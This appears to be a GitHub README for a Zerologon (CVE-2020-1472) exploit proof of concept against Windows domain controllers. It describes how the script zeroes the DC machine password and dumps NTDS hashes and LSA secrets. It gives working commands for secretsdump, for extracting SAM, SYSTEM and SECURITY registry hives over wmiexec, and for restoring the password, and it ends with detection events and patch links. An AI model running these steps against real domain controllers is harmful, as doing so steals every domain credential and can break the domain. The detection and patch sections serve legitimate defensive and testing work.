# CVE-2020-1472 aka Zerologon Exploit POC
![cve-2020-1742](https://user-images.githubusercontent.com/1679089/93808219-8a607c00-fc00-11ea-9a19-5128a5a533e6.gif)

## What is it?
NetLogon (MS-NRPC), can establish inter-domain control vulnerable security channel.
It's possible to zero out the password for the machine account on domain controllers.

## Notes:
- DC will be semi broken while password is zero'ed out
- Could cause DNS issues with DC (fixed with reboot)
- Kerberos Tickets have a 10 hour lifetime before they expire
- Requires the latest impacket from [GitHub](https://github.com/SecureAuthCorp/impacket) with added netlogon structures.
- Do note that by default this changes the password of the domain controller system account. Yes this allows you to DCSync, but it also breaks communication with other domain controllers, so be careful with this!

## Research it:
- https://www.secura.com/pathtoimg.php?id=2055
- https://twitter.com/_dirkjan/status/1306280553281449985
- For more info and original research view [blog](https://www.secura.com/blog/zero-logon) or review the
[whitepaper](https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM/)

## Required Dependencies
- Requires the latest impacket from [GitHub](https://github.com/SecureAuthCorp/impacket) with added netlogon structures.

## Check if vulnerable:
- Default behavior of script is to check if vulnerable and not change anything!

## Usage zerologon.py
* Read the blog/whitepaper above so you know what you're doing
* This script will check domain controllers for CVE-2020-1472.
* If -exploit option provided it will:
  * Zero out the domain controllers system password
  * Will call secretsdump's DRSUAPI with the zeropassword to get ntds hashes
  * Will parse dumped data to get domain admin account with rid :500: and call secretsdump again to get lsa secrets 
  * Will parse second dump for plain_password_hex value 
  * will call restore script with hex value to restore the DC's system password to its original value
  
 ```bash
python zerologon.py 

usage: zerologon.py [-h] [-exploit] dc_name dc_ip

Tests whether a domain controller is vulnerable to the Zerologon attack. Resets the DC account password to an empty string
when vulnerable.

positional arguments:
  dc_name     The (NetBIOS) computer name of the domain controller.
  dc_ip       IP Address of the domain controller.

optional arguments:
  -h, --help  show this help message and exit
  -exploit    Zero out the computer's hash
```

## Manual Restore steps
To resotre the DC to its origninal state you will need to restore the system password to its orginal value. To do this you will need the 'plain_password_hex' value.

#### Reqired - 'plain_password_hex' value:
#### Option #1 (Extract plain_password_hex with secretsdump.py)
If you install a version of impacket from GitHub that was updated on or after September 15th 2020, secretsdump will automatically dump the plaintext machine password (hex encoded) when dumping the local registry secrets.

```bash
secretsdump.py da@da_ip -hashes da_hash -outputfile ntds && grep plain_password_hex ntds.secrets
```
#### Option #2 (Wmiexe.py -> Maunual extraction -> Secretsdump offline)  
Alternatively on slightly older versions you can dump this same password by first extracting the registry hives and then running secretsdump offline (it will then always print the plaintext key because it can't calculate the Kerberos hashes).

```bash
wmiexe.py da@dc_ip -hashes da_hash
```
```bash
reg save hklm\system system
reg save hklm\sam sam
reg save hklm\security security
get system
get sam
get security
del /f system security sam
```
```bash
secretsdump.py -sam sam -system system -security security local | grep hex
```
#### Restore Password
With this password you can run `restorepassword.py` with the `-hexpass` parameter. This will first authenticate with the empty password to the same DC and then set the password back to the original one. Make sure you supply the netbios name and IP again as target. 

Usasge:

```bash
python restorepassword.py domain/dc_name@dc_ip -hexpass plain_password_hex
```
Example:

```bash
python restorepassword.py testsegment/s2016dc@s2016dc -target-ip 192.168.222.113 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3...etc
```
		
## Detect it:
* Event 4661 with privilege request for SetPassword (without knowledge of old password) (screenshot attached)
* Event 4723 for an attempt made to change an account's password
* Event 4738 for a user account being changed for the Password Last Set value
		
## Patch it:
- [CVE-2020-1472 | Netlogon Elevation of Privilege Vulnerability](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472)
- [How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc)
- [MITRE CVE-2020-1472](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472)

# Affected systems:
- Windows Server 2008 R2 for x64-based Systems Service Pack 1
- Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
- Windows Server 2012
- Windows Server 2012 (Server Core installation)
- Windows Server 2012 R2
- Windows Server 2012 R2 (Server Core installation)
- Windows Server 2016
- Windows Server 2016 (Server Core installation)
- Windows Server 2019
- Windows Server 2019 (Server Core installation)
- Windows Server, version 1903 (Server Core installation)
- Windows Server, version 1909 (Server Core installation)
- Windows Server, version 2004 (Server Core installation)
